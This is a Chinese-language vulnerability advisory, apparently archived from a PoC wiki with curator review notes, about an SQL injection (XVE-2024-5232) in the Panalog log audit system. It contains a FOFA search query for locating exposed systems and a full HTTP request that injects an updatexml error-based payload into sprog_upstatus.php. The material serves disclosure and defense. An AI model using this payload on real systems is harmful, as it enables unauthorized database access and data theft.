---
cnvd: ""
fofa: "body=\"Maintain/cloud_index.php\""
source: "SourByte05/Vulnerability-Wiki-PoC"
product: "Panalog 日志审计系统"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "XVE-2024-5232"
referenced_identifiers: ""
identifier_role: "primary"
identifier_status: "unknown"
category_recommendation: "Web安全/其他软件/Panalog"
title: "Panalog 日志审计系统 sprog_upstatus.php SQL 注入漏洞(XVE-2024-5232)"
prerequisites: "来源所述条件，未列明部分仍待核：没有版本或鉴权范围"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-904fb8cb0c10ba3088384935"
entity_id: "ve-904fb8cb0c10ba3088384935"
schema_version: "1"
previous_fofa_unverified: "body="
---

## 核对与使用边界

- 测绘字段处置：原 fofa 字段为残缺表达式、错误平台语法或当前解析器不支持的形式，原值完整保留到 fofa_unverified，不把它当作已校验查询或受影响资产证据。正文检索方法保留；具体问题见下列原审阅项。

- 明确更正：XVE-2024-5232 是 XVE 编号，不是 CNVD；正文完整测绘语句不能缩成 `body=`。SQL 防护应使用固定查询结构并绑定数据参数，不能把任意 SQL 文本交给所谓预编译当作修复。
- Panalog 产品缺陷不等同 PHP 运行时漏洞；“已知在野”缺事件来源和日期，保持待核。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：没有版本或鉴权范围

代码与实验材料：updatexml错误SQL与截图，状态更新型接口可能修改业务状态

来源证据范围：SourByte05无厂商补丁公告

- **事实待核（1）**：分类及编号命名空间错误；依据：Panalog在PHP目录；cnvd:XVE-2024-5232。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **代码与转录边界（2）**：元数据截断且在野结论无依据；依据：fofa只body=，正文完整Maintain/cloud_index.php；状态表已知在野无出处。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **事实待核（3）**：缺版本修复与参数绑定建议精度；依据：只产品名，预编译传入SQL的说法需改为固定查询和绑定数据参数。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Panalog 日志审计系统 sprog_upstatus.php SQL 注入漏洞(XVE-2024-5232)

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

# 漏洞描述

 /Maintain/sprog_upstatus.php 接口处的 id 参数存在 SQL 注入漏洞，可导致数据库信息泄露从而获取敏感信息，甚至可能被攻击者进一步利用造成更大危害。

影响版本

Panalog 日志审计系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 高 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="Maintain/cloud_index.php"

POC/EXP：

```http
GET /Maintain/sprog_upstatus.php?status=1&rdb=1&id=1%20and%20updatexml(1,concat(0x7e,version(),0x7e),1) HTTP/1.1
Host: 127.0.0.1
Connection: keep-alive
sec-ch-ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Accept: */*
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
```


![image-20240804122552780](./.resource/Panalog日志审计系统sprog_upstatus.phpSQL注入漏洞XVE-2024-5232/media/image-20240804122552780.png)


# 修复方案

1. 对传入的 sql 语句进行预编译处理。

   部署Web应用防火墙，对数据库操作进行监控。
   
   如非必要，禁止公网访问该系统。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
